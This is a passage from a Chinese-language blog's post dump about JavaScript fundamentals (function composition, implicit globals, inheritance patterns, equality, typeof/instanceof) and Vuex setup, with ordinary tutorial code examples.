函数，它接受任意多个函数作为参数（这些函数都只接受一个参数），然后 compose 返回的也是一个函数，达到以下的效果：const operate = compose(div2, mul3, add1, add1)operate(0) // =&gt; 相当于 div2(mul3(add1(add1(0))))operate(2) // =&gt; 相当于 div2(mul3(add1(add1(2)))) 我们直接看怎么实现的：1234567const compose = (...fns) =&gt; fns.reduce((f, g) =&gt; (...args) =&gt; f(g(...args)));var add1 = x =&gt; x+1;var mul3 = x=&gt; x*3;var div2 = x=&gt; x/2;var operate = compose(div2,mul3,add1,add1);operate(0); // 3operate(2); // 6 使用 Array.reduce() 和 ES6 的 rest参数，执行从右向左的函数组合。最后一个 (最右边) 的函数可以接受一个或多个参数，其余的函数必须是一元的。如果觉得很难看懂的话，我们把箭头函数改成 function：123456789101112var compose2 = function (...fns)&#123; return fns.reduce(function (f,g)&#123; return function(...args)&#123; return f(g(...args)); &#125; &#125;)&#125;var add1 = x =&gt; x+1;var mul3 = x=&gt; x*3;var div2 = x=&gt; x/2;var operate = compose(div2,mul3,add1,add1);operate(0); // 3","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"JavaScript一些思考","slug":"JavaScript一些思考","date":"2018-04-19T01:39:55.000Z","updated":"2018-04-19T03:01:31.789Z","comments":true,"path":"2018/04/19/JavaScript一些思考/","link":"","permalink":"https://recallhyx.github.io/2018/04/19/JavaScript一些思考/","excerpt":"","text":"前言最近走马观花的了解了很多东西，感觉web前端的趋势和发展很快，但是唯一不变的就是基础，所以需要把基础打好，把 JavaScript 学好 ，才能以不变应万变。 全局变量我们都很熟悉全局变量了，看一道面试题12345(function ()&#123; var a = b = 1;&#125;)()console.log(b);// 1console.log(a);// Uncaught ReferenceError: a is not defined 实际上，JavaScript 是从右到左赋值的，相当于123(function ()&#123; var a = (b = 1);&#125;)() 先给 b 赋值，然后再把 b 的值赋值给 a。b 没有用 var 声明就赋值，所以是一个全局变量，因此能够在函数体外访问。所以如果是想用这种连续赋值的方式赋值又不想暴露全局变量的话，可以用以下的方式赋值：123456(function ()&#123; var a,b; a = b = 1;&#125;)()console.log(b);// Uncaught ReferenceError: b is not definedconsole.log(a);// Uncaught ReferenceError: a is not defined 其实全局变量分为两种，显式全局变量和隐式全局变量。隐式全局变量和明确定义的全局变量间有些小的差异，判断方法就是能否通过 delete 操作符让变量未定义的能力。 通过 var 创建的全局变量（任何函数之外的程序中创建）是不能被删除的。 无 var 创建的隐式全局变量（无视是否在函数中创建）是能被删除的。（即上例的 b） 让我们看个例子：12345678910111213141516// 定义三个全局变量var global_var = 1;global_novar = 2; // 反面教材(function () &#123; global_fromfunc = 3; // 反面教材&#125;());// 试图删除console.log(delete global_var); // falseconsole.log(delete global_novar); // trueconsole.log(delete global_fromfunc); // true// 测试该删除typeof global_var; // \"number\"typeof global_novar; // \"undefined\"typeof global_fromfunc; // \"undefined\" 这下我们就明白了，隐式全局变量并不是真正的全局变量，它们是全局对象的属性。属性是可以通过 delete 操作符删除的，而变量是不能的。所以隐式全局变量我们也可以通过全局对象来访问：1234(function ()&#123; var a = b = 1;&#125;)()console.log(window.b);// 1 当然，这种隐式全局变量是不安全的，因为是全局变量的属性，所以很可能被其他变量所覆盖导致代码出错：12345678// 文件1定义了 id 函数id = function()&#123; console.log('id');&#125;// 文件2定义了 id 变量并赋值id = 1;// 文件1 并不知道文件2定义了 id，并覆盖了id 函数，当执行的时候就会出错id();// Uncaught TypeError: id is not a function 所以为了团队开发，不要使用隐式全局变量。 for 循环很多人需要遍历一个数组的时候都是这样子的：123for(var i = 0; i &lt; arr.length; i++)&#123; &#125; 这样做每次循环都会获取数组的长度，这样会降低性能，特别是如果我们对 DOM 进行操作的时候：123for(var i = 0;i &lt; document.getElementsByTagName('div').length; i++)&#123;&#125; 每次都要获取 div ，会极大的降低性能，所以我们一般都会用一个变量保存：123for(var i = 0, len = arr.length; i &lt; len; i++)&#123;&#125; for-in 循环for-in 循环应该用在非数组对象的遍历上，而且 for-in 循环要小心使用，因为它会遍历原型链上的属性，我们先看一个例子：123456var div = document.getElementsByTagName('div')var count = 0;for(var value in div[0])&#123; count++;&#125;console.log(count)// 232 结果不一定就是正好 232 但是可以从这个例子看出来，一个 DOM 结点是有很多属性的，那如果我们恰巧在一个对象的原型链上添加了一个 DOM 结点，没有过滤掉的话就会白白浪费性能又得不到我们想要的结果。Object.hasOwnProperty() 能够帮我们过滤原型链上的属性：1234567891011121314151617181920212223242526272829303132333435363738// 对象var man = &#123; hands: 2, legs: 2, heads: 1&#125;;// 在代码的某个地方// 一个方法添加给了所有对象if (typeof Object.prototype.clone === \"undefined\") &#123; Object.prototype.clone = function () &#123;&#125;;&#125;// 1.// for-in 循环for (var i in man) &#123; if (man.hasOwnProperty(i)) &#123; // 过滤 console.log(i, \":\", man[i]); &#125;&#125;/* 控制台显示结果hands : 2legs : 2heads : 1*/// 2.// 反面例子:// for-in loop without checking hasOwnProperty()for (var i in man) &#123; console.log(i, \":\", man[i]);&#125;/*控制台显示结果hands : 2legs : 2heads : 1clone: function()*/ 让我们看另外一个例子：1234567891011var arr = [1,2,3];Array.prototype.a = 4;for(var i in arr)&#123; console.log(arr[i]);&#125;console.log('arr.length',arr.length);// 1// 2// 3// 4// arr.length 3 突然出现了 4 ，与我们实际的结果不一致，所以 for-in 不要用在数组上，还是用普通的 for 循环。 自定义 log很多时候我们都要用 console.log 来 debug，但是一堆 console.log 也不知道对应哪个文件的输出，所以我们需要自己自定义 log，在 log 加上前缀。123456function log() &#123; var args = Array.from(arguments); // 用 ES6 的 Array.from 将 arguments 对象转为数组 args.unshift('[app.js]'); // 在数组头部添加前缀 console.log.apply(console, args); // 调用console.log()&#125;log('hello','world') 个人不推荐用 &amp;&amp; 和 || 代替 if123var foo = 10; foo === 10 &amp;&amp; doSomething(); // 等效 if (foo == 10) doSomething(); foo === 5 || doSomething(); // 等效 if (foo != 5) doSomething(); 确实有人这么写，说是代码简洁了，但是如果不懂短路原理的人看这个就会混乱，毕竟一个团队技术水平参差不齐，而且代码以后也可能交给别人维护，可读性要比较好。 参考：深入理解JavaScript系列（1）：编写高质量JavaScript代码的基本要点JS里的进阶技巧","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"JavaScript ES6一些有用的语法特性（class继承）","slug":"ES6（5）","date":"2018-04-01T13:29:58.000Z","updated":"2018-04-25T03:00:43.190Z","comments":true,"path":"2018/04/01/ES6（5）/","link":"","permalink":"https://recallhyx.github.io/2018/04/01/ES6（5）/","excerpt":"","text":"前言一开始知道 ES6 引入了 Class（类）这个概念，作为对象的模板，觉得 JavaScript 写类的继承，能更省事省力了，但是在看《你不知道的JavaScript》后，有了更深层次的理解。 ES5 的继承我们要知道，在继承或者实例化时，JavaScript 的对象机制并不会自动执行复制行为。简单来说，JavaScript 中只有对象，并不存在可以被实例化的“类”。一个对象并不会被复制到其他对象，它们会被关联起来。ES5 没有类的概念，要想继承，就必须使用一些技巧。以下介绍 ES5 各种继承。 原型链继承1234567891011121314151617181920212223242526272829//-------------定义-------------function Parent()&#123; this.name = 'hyx'; this.arr = [1,2];&#125;Parent.prototype.getName = function()&#123; return this.name;&#125;function Child()&#123; this.age = 18;&#125;Child.prototype = new Parent()//核心//-------------例子-------------var child1 = new Child();var child2 = new Child();console.log(child1.getName());// hyxconsole.log(child2.getName());// hyxchild1.name = 'recall';console.log(child1.getName());// recallconsole.log(child2.getName());// hyxchild1.arr.push(3);console.log(child1.arr);// [1,2,3]console.log(child2.arr);// [1,2,3] 原型链继承最大的优点就是：简单，核心就一句话 Child.prototype = new Parent() 但是缺点也在例子中表现出来了，如果父类有引用对象如数组，在子类实例中改变数组，其他子类实例也会跟着变。而且在创建子类实例时，无法向父类构造函数传参。 构造函数继承1234567891011121314151617181920212223242526272829303132//-------------定义-------------function Parent(name)&#123; this.name = name; this.arr = [1,2]; // 将原型链上的函数转到父类中定义 this.getName = function()&#123; return this.name; &#125;&#125;function Child(name)&#123; Parent.call(this,name);// 核心&#125;//-------------例子-------------var child1 = new Child('hyx');var child2 = new Child('recall');console.log(child1.getName());// hyxconsole.log(child2.getName());// recallchild1.name = 'recall';console.log(child1.getName());// recallconsole.log(child2.getName());// recallchild1.arr.push(3);console.log(child1.arr);// [1,2,3]console.log(child2.arr);// [1,2]console.log(child1.getName===child2.getName);// false 构造函数继承解决了原型链继承的两个问题，却又出现了新的问题：每次实例化一个子类，就会重新定义一个函数 getName，console.log(child1.getName===child2.getName);// false 说明他们不是复用父类的 getName ，如果实例化多个子类，那内存会爆炸的。 组合继承1234567891011121314151617181920212223242526272829303132//-------------定义-------------function Parent(name)&#123; this.name = name; this.arr = [1,2];&#125;Parent.prototype.getName = function()&#123; return this.name;&#125;function Child(name)&#123; Parent.call(this,name);// 核心，第二次，在实例化的时候又调用一次父类构造函数&#125;Child.prototype = new Parent();// 核心，第一次调用父类构造函数//-------------例子-------------var child1 = new Child('hyx');var child2 = new Child('recall');console.log(child1.getName());// hyxconsole.log(child2.getName());// recallchild1.name = 'recall';console.log(child1.getName());// recallconsole.log(child2.getName());// recallchild1.arr.push(3);console.log(child1.arr);// [1,2,3]console.log(child2.arr);// [1,2]console.log(child1.getName===child2.getName);// true 顾名思义，组合继承就是将原型链继承和构造函数继承组合起来，所以核心就是两种继承的核心，而又互补，解决了各自的缺点。但还是有缺点的：子类原型上有一份多余的父类实例属性，因为父类构造函数被调用了两次，生成了两份，而子类实例上的那一份屏蔽了子类原型上的。 原型式继承网上很多原型式继承都是用到一下这个函数：12345function object(o)&#123; function F()&#123;&#125;; F.prototype = o; return new F();&#125; 这个函数本质上是为了给对象创建关联。这段代码使用了一个一次性函数 F ，我们通过改写它的 .prototype 属性使其指向想要关联的对象，然后再使用 new F() 来构造一个新对象进行关联。我们可以用 Object.create() 来代替上面这段代码，所以原型式继承如下：123456789101112131415161718192021222324252627282930//-------------定义-------------function Parent()&#123; this.name = 'hyx'; this.arr = [1,2]; this.getName = function()&#123; return this.name; &#125;&#125;var parent = new Parent();//-------------例子-------------var child1 = Object.create(parent);// 使用 Object.create()指向parentvar child2 = Object.create(parent);console.log(child1.getName());// hyxconsole.log(child2.getName());// hyxchild1.name = 'recall';console.log(child1.getName());// recallconsole.log(child2.getName());// hyxchild1.arr.push(3);console.log(child1.arr);// [1,2,3]console.log(child2.arr);// [1,2,3]child1.age = 18;console.log(child1.age);// 18console.log(child2.age);// undefined; 还有一种方式就是用对象：12345678910111213141516171819202122232425262728//-------------定义-------------var Parent&#123; name: 'hyx', arr: [1,2], getName: function()&#123; return this.name; &#125;&#125;//-------------例子-------------var child1 = Object.create(Parent);var child2 = Object.create(Parent);console.log(child1.getName());// hyxconsole.log(child2.getName());// hyxchild1.name = 'recall';console.log(child1.getName());// recallconsole.log(child2.getName());// hyxchild1.arr.push(3);console.log(child1.arr);// [1,2,3]console.log(child2.arr);// [1,2,3]child1.age = 18;console.log(child1.age);// 18console.log(child2.age);// undefined; 和原型链继承一样，继承的属性由所有实例共享，改动一个实例的引用类型值时，所有实例都会改变。还有一个缺点就是无法实现代码复用，因为新对象是现取的，属性是现添的，都没用函数封装，复用不了。 寄生式继承1234567891011121314151617181920212223242526272829303132333435//-------------定义-------------function create(obj)&#123; var clone = Object.create(obj); // 在这里添加属性或方法 clone.arr = [1,2]; clone.age = 18; clone.getAge = function()&#123; return clone.age; &#125; return clone;&#125;function Parent()&#123; this.name = 'hyx'; this.getName = function()&#123; return this.name; &#125;&#125;//-------------例子-------------var child1 = create(new Parent);// 实例化var child2 = create(new Parent);console.log(child1.getName());// hyxconsole.log(child2.getName());// hyxconsole.log(child1.getAge === child2.getAge);// falsechild1.name = 'recall';console.log(child1.getName());// recallconsole.log(child2.getName());// hyxchild1.arr.push(3);console.log(child1.arr);// [1,2,3]console.log(child2.arr);// [1,2] 寄生式继承同样也有对象的写法：1234567891011121314151617181920212223242526272829303132333435//-------------定义-------------function create(obj)&#123; var clone = Object.create(obj); // 在这里添加属性或方法 clone.arr = [1,2]; clone.age = 18; clone.getAge = function()&#123; return clone.age; &#125; return clone;&#125;var Parent = &#123; name : 'hyx', getName : function()&#123; return this.name; &#125;&#125;//-------------例子-------------var child1 = create(Parent);// 这里不一样！var child2 = create(Parent);console.log(child1.getName());// hyxconsole.log(child2.getName());// hyxconsole.log(child1.getAge === child2.getAge);// falsechild1.name = 'recall';console.log(child1.getName());// recallconsole.log(child2.getName());// hyxchild1.arr.push(3);console.log(child1.arr);// [1,2,3]console.log(child2.arr);// [1,2] 其实 create(obj) 这个函数就是我们子类的定义，我们的子类实例化都是通过这个函数生成的，但是也有缺点，子类里面新增的函数无法实现函数复用。 寄生组合继承12345function inheritPrototype(Child, Parent) &#123; var prototype = Object.create(Parent.prototype) prototype.constructor = Child Child.prototype = prototype&#125; 该函数实现了寄生组合继承的最简单形式，这个函数接受两个参数，一个子类，一个父类，第一步创建父类原型的副本，第二步将创建的副本添加 constructor 属性，第三步将子类的原型指向这个副本。然后我们分别定义父类和子类：12345678910111213//-------------定义-------------function Parent()&#123; this.name = 'hyx'; this.arr = [1,2];&#125;// 函数声明要在父类外Parent.prototype.getName = function()&#123; return this.name;&#125;function Child()&#123; Parent.call(this);// 核心 this.age = 18;&#125; 接着我们使用 inheritPrototype 绑定父类和子类：1inheritPrototype(Child,Parent); 最终的例子：12345678910111213141516171819202122232425262728293031323334353637function inheritPrototype(Child, Parent) &#123; var prototype = Object.create(Parent.prototype) prototype.constructor = Child Child.prototype = prototype&#125;//-------------定义-------------function Parent()&#123; this.name = 'hyx'; this.arr = [1,2];&#125;// 函数声明要在父类外Parent.prototype.getName = function()&#123; return this.name;&#125;function Child()&#123; Parent.call(this);// 核心 this.age = 18;&#125;inheritPrototype(Child,Parent);//-------------例子-------------var child1 = new Child();var child2 = new Child();console.log(child1.getName());// hyxconsole.log(child2.getName());// hyxconsole.log(child1.getAge === child2.getAge);// truechild1.name = 'recall';console.log(child1.getName());// recallconsole.log(child2.getName());// hyxchild1.arr.push(3);console.log(child1.arr);// [1,2,3]console.log(child2.arr);// [1,2] 完美，函数可以复用，子类可以自由定义，而且也没有组合式继承的两次调用父类的问题。除了要将函数用 prototype的形式声明在外面，也没啥缺点了。 ES6 的继承ES5 那么多继承方式，看的眼花缭乱的，还好，ES6 提供了一个 class 语法糖，新的 class 写法只是让对象原型的写法更加清晰、更像面向对象编程的语法而已。让我们用 ES6 的 class 来重写上面的例子：12345678910111213141516171819class Parent&#123; constructor(name)&#123; this.name = name; &#125; getName()&#123; return this.name; &#125;&#125;class Child extends Parent&#123; constructor(name,age)&#123; super(name); this.age = age; &#125; toString()&#123; console.log('Child name is '+super.getName()+' Child age is '+ this.age); &#125;&#125;var child = new Child('hyx',18);child.toString();// Child name is hyx Child age is 18 这样写就好看多了，函数和定义都在类里面。子类必须在 constructor 方法中调用 super 方法，否则新建实例时会报错。这是因为子类没有自己的 this 对象，而是继承父类的 this对象，然后对其进行加工。如果不调用 super 方法，子类就得不到 this 对象。 如果子类没有定义 constructor方法，这个方法会被默认添加。 ES5 的继承，实质是先创造子类的实例对象 this，然后再将父类的方法添加到 this 上面（Parent.apply(this)）。ES6 的继承机制完全不同，实质是先创造父类的实例对象 this （所以必须先调用 super 方法），然后再用子类的构造函数修改 this 。 ES6 的 class 有一个缺点，class 不能声明静态属性，（静态属性指的是 Class 本身的属性，即 Class.propName，而不是定义在实例对象（this）上的属性。）12345class Foo &#123;&#125;Foo.prop = 1;Foo.prop // 1 上面的写法为Foo类定义了一个静态属性prop。 目前，只有这种写法可行，因为 ES6 明确规定，Class 内部只有静态方法，没有静态属性。12345678910// 以下两种写法都无效class Foo &#123; // 写法一 prop: 2 // 写法二 static prop: 2&#125;Foo.prop // undefined 但是 Class 却可以有静态方法：1234567891011class Foo &#123; static classMethod() &#123; return 'hello'; &#125;&#125;Foo.classMethod() // 'hello'var foo = new Foo();foo.classMethod();// TypeError: foo.classMethod is not a function 上面代码中，Foo 类的 classMethod 方法前有 static 关键字，表明该方法是一个静态方法，可以直接在 Foo 类上调用（Foo.classMethod()），而不是在 Foo 类的实例上调用。如果在实例上调用静态方法，会抛出一个错误，表示不存在该方法。 对 Class 的思考平心而论， class 语法确实解决了典型原型风格代码中许多显而易见的（语法）问题和缺点。然而， class 语法并没有解决所有的问题，在 JavaScript 中使用“类”设计模式仍然存在许多深层问题。class 并不会像传统面向类的语言一样在声明时静态复制所有行为。如果你（有意或无意）修改或者替换了父“类”中的一个方法，那子“类”和所有实例都会受到影响，因为它们在定义时并没有进行复制，只是使用基于 [[Prototype]] 的实时委托：12345678910111213141516class C &#123;constructor() &#123;this.num = Math.random();&#125;rand() &#123;console.log( \"Random: \" + this.num );&#125;&#125;var c1 = new C();c1.rand(); // \"Random: 0.4324299...\"C.prototype.rand = function() &#123;console.log( \"Random: \" + Math.round( this.num * 1000 ));&#125;;var c2 = new C();c2.rand(); // \"Random: 867\"c1.rand(); // \"Random: 432\" 此外， class 语法仍然面临意外屏蔽的问题：1234567891011class C &#123;constructor(id) &#123;// 噢，郁闷，我们的 id 属性屏蔽了 id() 方法this.id = id;&#125;id() &#123;console.log( \"Id: \" + id );&#125;&#125;var c1 = new C( \"c1\" );c1.id(); // TypeError -- c1.id 现在是字符串 \"c1\" ES6 的 class 最大的问题在于，（像传统的类一样）它的语法有时会让你认为，定义了一个 class 后，它就变成了一个（未来会被实例化的）东西的静态定义。你会彻底忽略 C 是一个对象，是一个具体的可以直接交互的东西。在传统面向类的语言中，类定义之后就不会进行修改，所以类的设计模式就不支持修改。但是 JavaScript 最强大的特性之一就是它的动态性，任何对象的定义都可以修改（除非你把它设置成不可变）。 我们通过 ES5 和 ES6 的 class 继承的对比，可以知道，其实 JavaScript 的继承，更应该说是通过原型链进行委托。委托行为意味着某些对象在找不到属性或者方法引用时会把这个请求委托给另一个对象。这是一种极其强大的设计模式，和父类、子类、继承、多态等概念完全不同。对象并不是按照父类到子类的关系垂直组织的，而是通过任意方向的委托关联并排组织的。 参考：JavaScript继承（图解笔记）重新理解JS的6种继承方式Class 的继承《你不知道的JavaScript》","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"JavaScript关于判断的一些奇怪结果","slug":"JavaScript关于判断的一些奇怪结果","date":"2018-03-30T10:36:37.000Z","updated":"2018-04-25T02:59:46.294Z","comments":true,"path":"2018/03/30/JavaScript关于判断的一些奇怪结果/","link":"","permalink":"https://recallhyx.github.io/2018/03/30/JavaScript关于判断的一些奇怪结果/","excerpt":"","text":"前言JavaScript 的 == 和 === 两种判断相等的方法行为不一致，很让人头晕，而且还有 typeof 和 instanceof所以记录一下，解决这个问题 == 、 === 和 Object.is()==双等号 == ，也叫 宽松相等，相等操作符比较两个值是否相等，在比较前将两个被比较的值转换为相同类型。在转换后（等式的一边或两边都可能被转换），最终的比较方式等同于全等操作符 === 的比较方式。 相等操作符满足交换律。 经典例子12345678910111213141516171819var num = 0;var obj = new String('0');var str = \"0\";var b = false;console.log(num == obj); // trueconsole.log(num == str); // trueconsole.log(obj == str); // trueconsole.log(null == undefined); // trueconsole.log(0 == false);// trueconsole.log('' == false);// trueconsole.log('' == 0);// trueconsole.log(null == 0);// false;console.log(undefined == 0);// false;console.log(1 == true);// trueconsole.log(2 == true);// false 内部原理标准的相等性操作符（== 与 !=）使用了Abstract Equality Comparison Algorithm来比较操作符两侧的操作对象（x == y），该算法流程要点提取如下： 如果 x 或 y 中有一个为 NaN，则返回 false； 如果 x 与 y 皆为 null 或 undefined 中的一种类型，则返回 true（null == undefined // true）；否则返回 false（null == 0 // false）； 如果 x,y 类型不一致，且 x,y 为 String、Number、Boolean 中的某一类型，则将 x,y 使用 toNumber 函数转化为 Number 类型再进行比较； 如果 x，y 中有一个为 Object，则首先使用 ToPrimitive 函数将其转化为原始类型，再进行比较。 12345678910111213141516171819ToPrimitive(obj,preferredType)JS引擎内部转换为原始值ToPrimitive(obj,preferredType)函数接受两个参数，第一个obj为被转换的对象，第二个preferredType为希望转换成的类型（默认为空，接受的值为Number或String）在执行ToPrimitive(obj,preferredType)时如果第二个参数为空并且obj为Date的事例时，此时preferredType会被设置为String，其他情况下preferredType都会被设置为Number如果preferredType为Number，ToPrimitive执行过程如下：1. 如果obj为原始值，直接返回；2. 否则调用 obj.valueOf()，如果执行结果是原始值，返回之；3. 否则调用 obj.toString()，如果执行结果是原始值，返回之；4. 否则抛异常。如果preferredType为String，将上面的第2步和第3步调换，即：1. 如果obj为原始值，直接返回；2. 否则调用 obj.toString()，如果执行结果是原始值，返回之；3. 否则调用 obj.valueOf()，如果执行结果是原始值，返回之；4. 否则抛异常。 还有一种情况：1console.log([]==![]);// true 具体涉及到了运算符优先级，可以看看这篇文章，讲的非常详细 ===三等号 ===，叫 严格相等比较，三等号将进行相同的比较，而不进行类型转换 (如果类型不同, 只是总会返回 false ) 经典例子用 === 就不会出现 == 的一些奇怪的结果123456789101112131415var num = 0;var obj = new String(\"0\");var str = \"0\";var b = false;console.log(num === num); // trueconsole.log(obj === obj); // trueconsole.log(str === str); // trueconsole.log(num === obj); // falseconsole.log(num === str); // falseconsole.log(obj === str); // falseconsole.log(null === undefined); // falseconsole.log(obj === null); // falseconsole.log(obj === undefined); // false 在日常中使用全等操作符几乎总是正确的选择，但还是有几个特殊的例子1234console.log(NaN === NaN);// falseconsole.log(Symbol(1) === Symbol(1));// falseconsole.log(&#123;x:1&#125;===&#123;x:1&#125;);// falseconsole.log([]===[]);// false 对于 NaN ，是 IEEE 754 规范上写的，而 Symbol 是 ES6 新增的原始数据类型，代表的意思就是独一无二的，所以当然不会相等，{x:1} 是一个对象，即使再声明一个一样的对象，它的内存地址不一样，也当然不一样了，[] 也是同样的道理，内存地址不同运用在 == 也是一样的。 Object.is()由于 === 也会出现一些奇怪的判断，所以在 ES6 加入了 Object.is() 对于 NaN和 -0 和 +0 进行特殊处理。1console.log(Object.is(NaN,NaN));// true 全部比较 typeof 和 instanceof另外两个比较混乱的判断就是 typeof 和 instanceof typeoftypeof 操作符返回一个字符串，表示未经计算的操作数的类型。 经典例子123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// Numberstypeof 37 === 'number';typeof 3.14 === 'number';typeof Math.LN2 === 'number';typeof Infinity === 'number';typeof NaN === 'number'; // 尽管NaN是\"Not-A-Number\"的缩写typeof Number(1) === 'number'; // 但不要使用这种形式!// Stringstypeof \"\" === 'string';typeof \"bla\" === 'string';typeof (typeof 1) === 'string'; // typeof总是返回一个字符串typeof String(\"abc\") === 'string'; // 但不要使用这种形式!// Booleanstypeof true === 'boolean';typeof false === 'boolean';typeof Boolean(true) === 'boolean'; // 但不要使用这种形式!// Symbolstypeof Symbol() === 'symbol';typeof Symbol('foo') === 'symbol';typeof Symbol.iterator === 'symbol';// Undefinedtypeof undefined === 'undefined';typeof declaredButUndefinedVariable === 'undefined';typeof undeclaredVariable === 'undefined'; // Objectstypeof &#123;a:1&#125; === 'object';// 使用Array.isArray 或者 Object.prototype.toString.call// 区分数组,普通对象typeof [1, 2, 4] === 'object';typeof new Date() === 'object';// 下面的容易令人迷惑，不要使用！typeof new Boolean(true) === 'object';typeof new Number(1) === 'object';typeof new String(\"abc\") === 'object';// 函数typeof function()&#123;&#125; === 'function';typeof class C&#123;&#125; === 'function'typeof Math.sin === 'function';typeof new Function() === 'function'; typeof null还有一个特别的例子：1typeof null === 'object'; 官方解释是： 在 JavaScript 最初的实现中，JavaScript 中的值是由一个表示类型的标签和实际数据值表示的。对象的类型标签是 0。由于 null 代表的是空指针（大多数平台下值为 0x00），因此，null的类型标签也成为了 0，typeof null就错误的返回了”object”。 new 操作符123456789101112// 所有的构造函数在实例化一个对象的时候 typeof 都会返回 'object'var str = new String('String');var num = new Number(100);typeof str; // 'object'typeof num; // 'object'// 只有一个例外：构造函数var func = new Function();typeof func; // 'function' instanceof有时候我们需要判断一个对象的类型，如果我们用 typeof 只会得到 &quot;object&quot;：12345var arr = [1,2,3,4]typeof arr;// \"object\"var date = new Date();typeof date;// \"object\" 这个时候就要用 instanceof 。instanceof 运算符用来测试一个对象在其原型链中是否存在一个构造函数的 prototype 属性。12345var arr = [1,2,3,4]arr instanceof Array// truevar date = new Date();date instanceof Date// true 但这并不是 instanceof 原来的用法，instanceof 运算符用来检测 constructor.prototype 是否存在于参数 object 的原型链上。1234567891011121314151617181920212223242526// 定义构造函数function C()&#123;&#125; function D()&#123;&#125; var o = new C();o instanceof C; // true，因为 Object.getPrototypeOf(o) === C.prototypeo instanceof D; // false，因为 D.prototype不在o的原型链上o instanceof Object; // true,因为Object.prototype.isPrototypeOf(o)返回trueC.prototype instanceof Object // true,同上C.prototype = &#123;&#125;;var o2 = new C();o2 instanceof C; // trueo instanceof C; // false,C.prototype指向了一个空对象,这个空对象不在o的原型链上.D.prototype = new C(); // 继承var o3 = new D();o3 instanceof D; // trueo3 instanceof C; // true 需要注意的是，如果表达式 obj instanceof Foo 返回 true，则并不意味着该表达式会永远返回 true，因为 Foo.prototype 属性的值有可能会改变，改变之后的值很有可能不存在于 obj 的原型链上，这时原表达式的值就会成为 false 。另外一种情况下，原表达式的值也会改变，就是改变对象 obj 的原型链的情况，虽然在目前的 ES 规范中，我们只能读取对象的原型而不能改变它，但借助于非标准的__proto__魔法属性，是可以实现的。比如执行 obj.__proto__ = {} 之后，obj instanceof Foo 就会返回 false 了。 神奇的例子12345678910111213141516171819var simpleStr = \"This is a simple string\"; var myString = new String();var newStr = new String(\"String created with constructor\");var myDate = new Date();var myObj = &#123;&#125;;simpleStr instanceof String; // returns false, 检查原型链会找到 undefinedmyString instanceof String; // returns truenewStr instanceof String; // returns truemyString instanceof Object; // returns truemyObj instanceof Object; // returns true, despite an undefined prototype(&#123;&#125;) instanceof Object; // returns true, 同上myString instanceof Date; // returns falsemyDate instanceof Date; // returns truemyDate instanceof Object; // returns truemyDate instanceof String; // returns false 所以我们判断是否是数组还是用这种方法Object.prototype.toString.call(myObj) === &quot;[object Array]&quot; 或者 ES6 新增的 Array.isArray(myObj)。 参考MDN-typeofMDN-instanceofJavaScript 中的相等性判断","categories":[{"name":"前端","slug":"前端","permalink":"https://recallhyx.github.io/categories/前端/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://recallhyx.github.io/tags/javascript/"}]},{"title":"Vuex的一些总结","slug":"Vuex的一些总结","date":"2018-03-29T08:41:57.000Z","updated":"2018-05-25T14:11:43.860Z","comments":true,"path":"2018/03/29/Vuex的一些总结/","link":"","permalink":"https://recallhyx.github.io/2018/03/29/Vuex的一些总结/","excerpt":"","text":"前言最近在学 Vue 全家桶，遇到 Vuex 这个东西，记录一下学习过程及遇到的不懂的地方和一些坑。 Vuex 是个啥 Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。Vuex 也集成到 Vue 的官方调试工具 devtools extension，提供了诸如零配置的 time-travel 调试、状态快照导入导出等高级调试功能。 举个例子，父组件和子组件嵌套，父组件能通过 props 传递参数给子组件，这个在只嵌套一层子组件的情况下是推荐使用的，但是如果子组件又嵌套子组件，这样我们最里层的孙子组件，要获取状态只能子组件通过 props 传递，这样要写多几次 props，而且到后期嵌套的组件越多都不知道哪个 props 是从哪里传进来的。 Vuex就是把组件的共享状态抽取出来，以一个全局单例模式管理。在这种模式下，我们的组件树构成了一个巨大的“视图”，不管在树的哪个位置，任何组件都能获取状态或者触发行为。 对于中大型应用，才有使用 Vuex 的必要，如果是小型的应用，完全不需要使其复杂化。 Vuex 安装我是在 vue-cli 基础上进行学习的，不知道 vue-cli 的可以看一下我之前的文章 Vue-loader 入门首先我们安装 Vuex1npm install vuex --save 如果成功，我们可以在 package.json 文件中看到： Vuex 使用首先，我们要在 src 目录下新建一个文件夹 store ，然后在里面新建一个叫 index.js 的文件，这是我们组装模块并导出 store 的地方。然后我们再分别新建 mutations.js 和 actions.js 这两个文件，作为根级别的 mutation 和 根级别的 action ，就是抽出来公用的部分。最后我们新建一个文件夹 modules，里面放着我们的模块，然后我们在 modules 里面新建我们的模块 hello.js 。当然，我们还可以新建一个 mutation-types.js 的文件，直接在mutations.js 中映射相关的方法过来使用，这个文件是为了多人合作的时候方便管理。全部完成后的 store 目录如下： 挂载接下来我们就要将 Vuex 挂载到 Vue 上，在 index.js文件中：1234567891011121314151617// index.jsimport Vue from 'vue';import Vuex from 'vuex';import * as actions from './actions';import * as mutations from './mutations';import hello from './modules/hello'Vue.use(Vuex);const store = new Vuex.Store(&#123; actions, mutations, modules:&#123; hello &#125;&#125;);export default store; 然后我们在 main.js 里面，将我们的 store 引入：123456789101112131415// main.jsimport Vue from 'vue'import App from './App'import router from './router'import store from './store/index'Vue.config.productionTip = false/* eslint-disable no-new */new Vue(&#123; el: '#app', router, store,// 将store引入 components: &#123; App &#125;, template: '&lt;App/&gt;'&#125;) hello 模块接下来我们跳过 mutations.js 和 actions.js，因为我们这个只是示例，没有需要抽出来的公共的部分，将注意放在我们的 module 模块。当然，模块里面也可以再分 state.js，getters.js，mutations.js 和 actions.js ，然后在模块中引入，但是这就分的太细了。我们先定义 state，getters，mutations 和 actions：123456789101112// hello.jsconst state = &#123;&#125;;const getters = &#123;&#125;;const mutations = &#123;&#125;;const actions = &#123;&#125;;export default &#123; state, getters, mutations, actions&#125; 我们的原始 state 就一个 